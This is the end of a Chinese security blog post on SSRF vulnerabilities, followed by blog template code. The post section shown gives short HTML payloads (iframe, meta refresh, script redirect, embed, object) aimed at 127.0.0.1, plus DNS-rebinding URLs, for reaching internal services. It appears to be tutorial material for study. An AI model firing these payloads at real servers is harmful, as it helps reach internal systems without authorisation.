+<h4 id="1、使用iframe标签直接读取内网" tabindex="-1"><a class="headerlink" href="#1、使用iframe标签直接读取内网" aria-hidden="true"></a> (1)、使用iframe标签直接读取内网</h4>
+<p>代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800&quot;</span> <span class="attr">height</span>=<span class="string">&quot;10000&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="2、使用标签跳转内网" tabindex="-1"><a class="headerlink" href="#2、使用标签跳转内网" aria-hidden="true"></a> (2)、使用标签跳转内网</h4>
+<p><code>&lt;meta&gt;</code>和<code>&lt;script&gt;</code>标签进行跳转。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0; url=http://127.0.0.1/&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;http://127.0.0.1/&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="3、使用标签引入内网" tabindex="-1"><a class="headerlink" href="#3、使用标签引入内网" aria-hidden="true"></a> (3)、使用标签引入内网</h4>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/&quot;</span> <span class="attr">width</span>=<span class="string">&quot;600&quot;</span> <span class="attr">height</span>=<span class="string">&quot;800&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/html&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;http://127.0.0.1/&quot;</span> <span class="attr">width</span>=<span class="string">&quot;600&quot;</span> <span class="attr">height</span>=<span class="string">&quot;800&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="dns-rebinding" tabindex="-1"><a class="headerlink" href="#dns-rebinding" aria-hidden="true"></a> DNS rebinding</h3>
+<p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
+<p>在请求时注意<code>CDN</code>缓存的问题，可以尝试修改请求的url。</p>
+<p><a target="_blank" rel="noopener" href="http://7f000001.c0a80001.rbndr.us/flag.html?11">http://7f000001.c0a80001.rbndr.us/flag.html?11</a></p>
+<p><a target="_blank" rel="noopener" href="http://7f000001.c0a80001.rbndr.us/flag.html?22">http://7f000001.c0a80001.rbndr.us/flag.html?22</a></p>
+<p><a target="_blank" rel="noopener" href="http://7f000001.c0a80001.rbndr.us/flag.html?33">http://7f000001.c0a80001.rbndr.us/flag.html?33</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2026-01-15 09:41:31
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/SSRF/" title="SSRF">
+                        #SSRF
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/gopher%E5%8D%8F%E8%AE%AE/" title="gopher协议">
+                        #gopher协议
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Web%E5%AE%89%E5%85%A8/" title="Web安全">
+                        <b>#</b> Web安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf%E6%89%93redis"><span class="toc-text"> SSRF打Redis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%88%B0%E4%BA%86gopher%E5%8D%8F%E8%AE%AE"><span class="toc-text"> 使用到了gopher协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E7%9A%84%E8%AF%AD%E6%B3%95"><span class="toc-text"> Redis的语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8F%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-text"> ⚠️注意点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-text"> SSRF的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87url%E5%8C%B9%E9%85%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-text"> 绕过URL匹配字符的限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5302%E8%B7%B3%E8%BD%AC"><span class="toc-text"> 直接302跳转</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E6%9D%A1%E4%BB%B6%E7%9A%84302%E8%B7%B3%E8%BD%AC"><span class="toc-text"> 有条件的302跳转</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%90%8E%E7%AB%AF%E9%AA%8C%E8%AF%81%E4%BA%86%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9F%9F%E5%90%8D"><span class="toc-text"> (1)、后端验证了跳转的目标域名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%90%8E%E7%AB%AF%E9%AA%8C%E8%AF%81%E4%BA%86%E8%AF%B7%E6%B1%82%E8%BF%94%E5%9B%9E%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-text"> (2)、后端验证了请求返回的数据包</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91html%E6%B8%B2%E6%9F%93"><span class="toc-text"> 内网html渲染</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E4%BD%BF%E7%94%A8iframe%E6%A0%87%E7%AD%BE%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E5%86%85%E7%BD%91"><span class="toc-text"> (1)、使用iframe标签直接读取内网</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E4%BD%BF%E7%94%A8%E6%A0%87%E7%AD%BE%E8%B7%B3%E8%BD%AC%E5%86%85%E7%BD%91"><span class="toc-text"> (2)、使用标签跳转内网</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E4%BD%BF%E7%94%A8%E6%A0%87%E7%AD%BE%E5%BC%95%E5%85%A5%E5%86%85%E7%BD%91"><span class="toc-text"> (3)、使用标签引入内网</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dns-rebinding"><span class="toc-text"> DNS rebinding</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+  <!-- Giscus 评论区：基于 GitHub Discussions -->
+  <div class="giscus"></div>
+  <script src="https://giscus.app/client.js"
+          data-repo="x2nn/x2nn.github.io"
+          data-repo-id="R_kgDOMV-gkA"
+          data-category="Announcements"
+          data-category-id="DIC_kwDOMV-gkM4C7iiE"
+          data-mapping="pathname"
+          data-strict="0"
+          data-reactions-enabled="1"
+          data-emit-metadata="0"
+          data-input-position="top"
+          data-theme="preferred_color_scheme"
+          data-lang="zh-CN"
+          data-loading="lazy"
+          crossorigin="anonymous"
+          async>
+  </script>
+
+  <!-- 跟随站点 light/dark 动态切换 Giscus 主题 -->
+  <script>
+    (function () {
+      function currentMode() {
+        return document.documentElement.getAttribute('color-mode') === 'dark' ? 'dark' : 'light';
+      }
+      function postTheme() {
+        var frame = document.querySelector('iframe.giscus-frame');
+        if (!frame) return;
+        frame.contentWindow.postMessage(
+          { giscus: { setConfig: { theme: currentMode() } } },
+          'https://giscus.app'
+        );
+      }
+      new MutationObserver(postTheme).observe(document.documentElement, {
+        attributes: true,
+        attributeFilter: ['color-mode']
+      });
+    })();
+  </script>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/x2nn">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+        <li>
+          
+              <a title="rss" href="/atom.xml">
+                <i class="iconfont icon-rss"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://x2nn.github.io">Copyright © 2024 - 2026</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87 + '&url=' + https%3A%2F%2Fx2nn.github.io%2F2024%2F07%2F25%2FSSRF%25E6%25BC%258F%25E6%25B4%259E%25E7%25AF%2587%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://x2nn.github.io/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
